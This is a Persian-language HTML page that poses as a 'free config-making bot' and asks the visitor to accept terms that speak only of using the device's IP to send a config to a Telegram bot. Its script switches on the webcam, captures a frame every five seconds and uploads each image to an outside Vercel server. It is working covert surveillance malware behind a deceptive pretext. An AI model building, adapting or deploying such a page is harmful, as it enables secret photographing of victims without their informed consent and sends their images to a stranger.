<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>بات ساخت کانفیگ رایگان</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background:#0f172a; color:#fff; font-family:sans-serif; text-align:center; padding:30px }
    .box { max-width:420px; margin:auto; background:#020617; padding:20px; border-radius:12px }
    button { padding:12px 20px; font-size:16px; cursor:pointer; border-radius:8px; border:none; margin-top:10px }
    video { width:100%; margin-top:15px; border-radius:10px }
    #status { margin-top:10px; font-size:14px; color:#22c55e }
  </style>
</head>
<body>
  <div class="box">
    <h2>شرایط استفاده</h2>
    <p>با کلیک روی دکمه زیر، شما اجازه می‌دهید از آیپی دستگاه استفاده شود و کانفیگ مخصوص شما به بات تلگرام فرستاده شود.</p>

    <button id="startBtn">می‌پذیرم و ادامه</button>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <div id="status"></div>
  </div>

  <script>
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');
    let stream, intervalId;

    // لینک سرور Vercel با اسم پروژه جدید
    const SERVER_URL = 'https://telegram-server-2.vercel.app/api/upload';

    startBtn.onclick = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video:true });
        video.srcObject = stream;
        startBtn.disabled = true;
        status.innerText = 'دوربین فعال شد ✅';

        intervalId = setInterval(() => {
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video,0,0,canvas.width,canvas.height);

          canvas.toBlob(async (blob) => {
            try {
              const resp = await fetch(SERVER_URL, {
                method: 'POST',
                body: blob
              });
              if(resp.ok) status.innerText = `عکس فرستاده شد: ${new Date().toLocaleTimeString()}`;
              else status.innerText = 'خطا در ارسال به سرور';
            } catch(err) {
              status.innerText = 'خطا در اتصال به سرور';
              console.error(err);
            }
          },'image/jpeg',0.9);
        }, 5000); // هر ۵ ثانیه یک عکس
      } catch(err) {
        alert('اجازه دسترسی به دوربین داده نشد');
        console.error(err);
      }
    };
  </script>
</body>
</html>
